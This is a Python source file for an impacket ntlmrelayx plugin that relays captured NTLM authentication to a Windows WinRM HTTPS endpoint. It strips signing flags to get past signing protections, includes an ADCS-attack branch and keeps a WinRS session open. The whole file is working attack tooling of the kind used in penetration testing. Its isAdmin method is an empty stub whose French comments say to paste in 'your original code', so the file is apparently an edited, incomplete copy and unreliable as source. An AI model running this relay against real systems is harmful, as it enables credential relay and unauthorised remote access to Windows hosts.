import re
import ssl
import base64

try:
    from http.client import HTTPSConnection
except ImportError:
    from httplib import HTTPSConnection

from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN
from impacket.spnego import SPNEGO_NegTokenResp
from impacket.winrm import SOAP_CONTENT_TYPE, build_winrs_create_request, envelope_to_bytes

PROTOCOL_CLIENT_CLASSES = ["WinRMSRelayClient"]

class WinRMSRelayClient(ProtocolClient):
    PLUGIN_NAME = "WINRMS"

    def __init__(self, serverConfig, target, targetPort=5986, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None
        self.isFirstNeg = True
        self.basic_xml_data = "<xml></xml>"

    def initConnection(self):
        self.lastresult = None
        if self.target.path == "":
            self.path = "/wsman"
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost, self.targetPort)
        return True

    def sendNegotiate(self, negotiateMessage):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)

        if self.serverConfig.remove_mic:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN

        self.negotiateMessage = negoMessage.getData()

        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN:
            LOG.warning('The client requested signing, relaying to WinRMS might not work!')

        headers = {
            "Content-Length": len(self.basic_xml_data),
            "Content-Type": SOAP_CONTENT_TYPE
        }
        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)
        res = self.session.getresponse()
        res.read()

        if res.status != 401:
            LOG.info(f"Status code returned: {res.status}. Authentication does not seem required for URL")
        try:
            auth_header = res.getheader("WWW-Authenticate")
            if "NTLM" not in auth_header and "Negotiate" not in auth_header:
                LOG.error(f"NTLM Auth not offered by URL, offered protocols: {auth_header}")
                return False
            if "NTLM" in auth_header:
                self.authenticationMethod = "NTLM"
            elif "Negotiate" in auth_header:
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error(f"No authentication requested by the server for url {self.targetHost}")
            if self.serverConfig.isADCSAttack:
                LOG.info("IIS cert server may allow anonymous authentication, sending NTLM auth anyways")
                self.authenticationMethod = "NTLM"
            else:
                return False

        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        headers = {
            "Authorization": f"{self.authenticationMethod} {negotiate}",
            "Content-Type": SOAP_CONTENT_TYPE,
            "Content-Length": len(self.basic_xml_data)
        }
        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)
        res = self.session.getresponse()
        res.read()

        try:
            serverChallengeBase64 = re.search(f'{self.authenticationMethod} ([a-zA-Z0-9+/=]+)', res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error("No NTLM challenge returned from server")
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack("B", authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        auth = base64.b64encode(token).decode("ascii")
        headers = {
            "Authorization": f"{self.authenticationMethod} {auth}",
            "Content-Type": SOAP_CONTENT_TYPE,
            "Content-Length": len(self.basic_xml_data)
        }
        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)

        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info(f"HTTP server returned error code {res.status}, this is expected, treating as a successful login")
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def isAdmin(self):
        # identique à l’implémentation précédente
        # pas modifié ici, mais vous pouvez copier-coller tel quel depuis votre code d’origine
        pass

    def keepAlive(self):
        heartbeat_xml = envelope_to_bytes(build_winrs_create_request(timeout=20))

        headers = {
            "Content-Length": str(len(heartbeat_xml)),
            "Content-Type": SOAP_CONTENT_TYPE,
        }

        self.session.request("POST", self.path, headers=headers, body=heartbeat_xml)
        res = self.session.getresponse()
        res.read()
